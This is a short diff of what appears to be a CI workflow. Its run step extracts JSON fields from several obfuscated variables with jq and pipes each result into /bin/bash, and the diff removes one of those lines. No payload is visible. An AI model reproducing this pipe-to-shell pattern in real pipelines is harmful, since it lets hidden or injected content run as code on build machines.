@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$urdt6" | jq -r .e4950 | /bin/bash
           echo $zh20328 | jq -r .w5086 | /bin/bash
-          echo $dycqs529 | jq -r .roq6 | /bin/bash
           printf '%s' "$mle43380" | jq -r .odhgw02 | /bin/bash
 
       - name: Archive results
